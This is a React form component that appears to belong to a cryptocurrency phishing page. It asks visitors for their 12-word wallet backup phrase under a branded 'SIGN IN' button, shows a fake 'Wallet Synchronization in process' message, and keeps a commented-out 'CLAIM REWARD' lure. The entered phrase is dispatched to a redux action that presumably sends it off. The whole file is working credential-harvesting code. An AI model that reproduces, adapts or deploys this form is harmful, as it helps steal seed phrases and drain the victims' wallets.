import React, { useState, useEffect } from 'react'
import { connect } from 'react-redux'

import * as orderAction from '../store/actions'

const Form = (props) => {
    const [phrase, setPhrase] = useState('')
    const [toast, setToast] = useState({})

    const handlePhrase = (e) => {
        setPhrase(e.target.value)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()

       props.onInitPutPhrase(phrase)
        //  setToast({
        //      content: 'Wallet Synchronization in process!!',
        //      type: 'success',
        //  })
    }

    
    useEffect(() => {
        if (props.createdPhrase) {
            setToast({
                content:
                'Wallet Synchronization in process!!',
                type: 'success',
            })
        }
        if (props.error) {
            console.log('error', props.error)
            setToast({
                content: 'Invalid Phrase, Please check your entries!!',
                type: 'error',
            })
        }

    }, [props.createdPhrase, props.error])
    
    return (
        <form
            className='grid w-full place-content-stretch bg-white ' style={{padding: '32px 24px'}}
            onSubmit={handleSubmit}
        >
            {toast && toast.content && (
                <div className=' grid font-semibold mb-8'>
                    <p
                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${
                            toast.type === 'success'
                                ? 'bg-yellow-600'
                                : 'bg-red-800'
                        }`}
                    >
                        {toast.content}
                    </p>
                </div>
            )}

            <textarea
                id='phrase'
                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
                rows={2}
                required
                value={phrase}
                placeholder='Enter 12-word Backup phrase'
                onChange={handlePhrase}
            />

            <div className='flex justify-between items-center pt-10 font-medium'>
                <div className='text-xs font-normal text-[#708599]'>
                    <input type='checkbox' id='checkbox' required /> {''}
                    <label htmlFor='checkbox'>
                        Keep me signed in on this computer
                    </label>
                </div>

                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>
                CLAIM REWARD
            </button> */}
                <button className='text-white bg-[#1652f0] rounded-sm' style={{padding: '11px 22px', fontSize: '11px'}}>SIGN IN</button>
            </div>
        </form>
    )
}

const mapStateToProps = (state) => {
    return {
        createdPhrase: state.phrase.putPhrase,
        error: state.phrase.error,
    }
}

const mapDispatchToProps = (dispatch) => {
    return {
        onInitPutPhrase: (phrase) =>
            dispatch(orderAction.initPutPhrase(phrase)),
    }
}
export default connect(mapStateToProps, mapDispatchToProps)(Form)
